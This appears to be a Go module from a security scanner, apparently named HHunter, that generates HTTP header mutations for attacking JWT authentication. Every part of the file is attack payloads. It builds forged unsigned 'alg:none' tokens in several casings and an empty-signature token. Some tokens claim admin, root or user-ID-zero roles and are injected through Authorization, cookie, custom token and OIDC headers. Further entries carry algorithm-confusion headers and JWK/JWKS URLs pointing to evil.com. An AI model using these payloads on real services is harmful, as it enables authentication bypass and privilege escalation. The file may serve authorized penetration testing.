package headers

import (
	"encoding/base64"

	"github.com/cc1a2b/HHunter/engine"
)

func GetJWTMutations() []engine.Mutation {
	// alg:none JWT = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
	algNoneHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	algNonePayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"1","role":"admin","iat":1516239022}`))
	algNoneJWT := algNoneHeader + "." + algNonePayload + "."

	// alg:None (capitalized)
	algNoneCap := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"None","typ":"JWT"}`))
	algNoneCapJWT := algNoneCap + "." + algNonePayload + "."

	// alg:NONE
	algNoneUpper := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"NONE","typ":"JWT"}`))
	algNoneUpperJWT := algNoneUpper + "." + algNonePayload + "."

	// alg:nOnE (mixed case)
	algNoneMixed := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"nOnE","typ":"JWT"}`))
	algNoneMixedJWT := algNoneMixed + "." + algNonePayload + "."

	// Empty signature JWT with HS256
	algHS256Header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	emptySignJWT := algHS256Header + "." + algNonePayload + "."

	// Admin payload
	adminPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin","isAdmin":true,"iat":1516239022}`))
	adminJWT := algNoneHeader + "." + adminPayload + "."

	// Root payload
	rootPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"root","role":"superadmin","iat":1516239022}`))
	rootJWT := algNoneHeader + "." + rootPayload + "."

	// User ID 0 payload
	zeroIDPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"0","role":"admin","iat":1516239022}`))
	zeroIDJWT := algNoneHeader + "." + zeroIDPayload + "."

	return []engine.Mutation{
		// JWT alg:none attacks
		{Header: "Authorization", Value: "Bearer " + algNoneJWT, Category: "JWT", Impact: "JWT Algorithm None Attack"},
		{Header: "Authorization", Value: "Bearer " + algNoneCapJWT, Category: "JWT", Impact: "JWT Algorithm None (Capitalized)"},
		{Header: "Authorization", Value: "Bearer " + algNoneUpperJWT, Category: "JWT", Impact: "JWT Algorithm NONE (Upper)"},
		{Header: "Authorization", Value: "Bearer " + algNoneMixedJWT, Category: "JWT", Impact: "JWT Algorithm nOnE (Mixed)"},

		// JWT empty signature
		{Header: "Authorization", Value: "Bearer " + emptySignJWT, Category: "JWT", Impact: "JWT Empty Signature"},

		// JWT admin privilege escalation
		{Header: "Authorization", Value: "Bearer " + adminJWT, Category: "JWT", Impact: "JWT Admin Role Injection"},
		{Header: "Authorization", Value: "Bearer " + rootJWT, Category: "JWT", Impact: "JWT Root Role Injection"},
		{Header: "Authorization", Value: "Bearer " + zeroIDJWT, Category: "JWT", Impact: "JWT User ID Zero Attack"},

		// JWT via different headers
		{Header: "X-Access-Token", Value: algNoneJWT, Category: "JWT", Impact: "JWT alg:none via X-Access-Token"},
		{Header: "X-Auth-Token", Value: algNoneJWT, Category: "JWT", Impact: "JWT alg:none via X-Auth-Token"},
		{Header: "X-JWT-Token", Value: algNoneJWT, Category: "JWT", Impact: "JWT alg:none via X-JWT-Token"},
		{Header: "Token", Value: algNoneJWT, Category: "JWT", Impact: "JWT alg:none via Token header"},
		{Header: "Cookie", Value: "token=" + algNoneJWT, Category: "JWT", Impact: "JWT alg:none via Cookie"},
		{Header: "Cookie", Value: "session=" + algNoneJWT, Category: "JWT", Impact: "JWT alg:none via Session Cookie"},
		{Header: "Cookie", Value: "jwt=" + algNoneJWT, Category: "JWT", Impact: "JWT alg:none via JWT Cookie"},
		{Header: "Cookie", Value: "access_token=" + adminJWT, Category: "JWT", Impact: "JWT Admin via access_token Cookie"},

		// JWT confusion attacks
		{Header: "Authorization", Value: "Bearer invalidjwt", Category: "JWT", Impact: "JWT Invalid Token Error Probe"},
		{Header: "Authorization", Value: "Bearer .", Category: "JWT", Impact: "JWT Minimal Token Probe"},
		{Header: "Authorization", Value: "Bearer ..", Category: "JWT", Impact: "JWT Empty Parts Probe"},
		{Header: "Authorization", Value: "Bearer a.b.c", Category: "JWT", Impact: "JWT Malformed Parts Probe"},
		{Header: "Authorization", Value: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.", Category: "JWT", Impact: "JWT Empty Payload"},

		// JWT key confusion (RS256 -> HS256)
		{Header: "X-JWT-Algorithm", Value: "HS256", Category: "JWT", Impact: "JWT Algorithm Confusion Header"},
		{Header: "X-JWT-Algorithm", Value: "none", Category: "JWT", Impact: "JWT Algorithm None Header"},

		// JWK/JKU/x5u injection
		{Header: "X-JWK-URL", Value: "https://evil.com/.well-known/jwks.json", Category: "JWT", Impact: "JWK URL Injection"},
		{Header: "X-JWKS-URL", Value: "https://evil.com/jwks.json", Category: "JWT", Impact: "JWKS URL Injection"},

		// OAuth2 / OIDC related
		{Header: "Authorization", Value: "Bearer access_denied", Category: "JWT", Impact: "OAuth Error Token Probe"},
		{Header: "Authorization", Value: "Bearer expired", Category: "JWT", Impact: "OAuth Expired Token Probe"},
		{Header: "Authorization", Value: "Bearer refresh", Category: "JWT", Impact: "OAuth Refresh Token Probe"},
		{Header: "X-ID-Token", Value: algNoneJWT, Category: "JWT", Impact: "OIDC ID Token Injection"},
	}
}
